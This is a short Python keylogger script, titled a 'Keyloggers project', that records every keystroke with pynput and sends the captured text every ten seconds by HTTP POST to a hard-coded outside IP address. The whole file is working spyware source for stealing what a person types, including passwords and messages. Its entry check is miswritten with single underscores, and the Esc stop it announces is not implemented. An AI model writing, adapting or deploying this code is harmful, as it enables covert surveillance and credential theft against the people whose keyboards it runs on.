# Keyloggers project
from pynput import keyboard
import requests
import json
import threading

text = ""  # Store the captured keystrokes
ip_address = "109.74.200.23"  # Server IP address
port_number = "8080"  # Server port
time_interval = 10  # Interval to send data to the server in seconds

def send_post_req():
    global text  # Reference the global variable
    if text.strip():  # Send data only if there's something to send
        try:
            # Convert keystrokes to JSON format
            payload = json.dumps({"keyboardData": text})
            # POST request to the server
            response = requests.post(
                f"http://{ip_address}:{port_number}",
                data=payload,
                headers={"Content-Type": "application/json"}
            )
            if response.status_code == 200:
                print("Data sent successfully!")
            else:
                print(f"Failed to send data. Status code: {response.status_code}")
        except Exception as e:
            print(f"Error sending request: {e}")
        finally:
            # Clear the text after sending
            text = ""

    # Restart the timer
    timer = threading.Timer(time_interval, send_post_req)
    timer.start()

def on_press(key):
    """
    Logs the pressed key and handles special cases like ENTER, BACKSPACE, etc.
    """
    global text
    try:
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.backspace:
            text = text[:-1] if text else text
        elif hasattr(key, 'char') and key.char is not None:
            text += key.char  # Capture alphanumeric keys
        else:
            text += f"[{key.name}]"  # Capture special keys like shift, ctrl
    except Exception as e:
        print(f"Error processing key: {e}")

def start_keylogger():
    """
    Starts the keylogger with a keyboard listener and periodic server communication.
    """
    print("Keylogger started... Press ESC to stop.")
    send_post_req()  # Start sending data periodically
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()  # Keep the listener active

if _name_ == "_main_":
    start_keylogger()
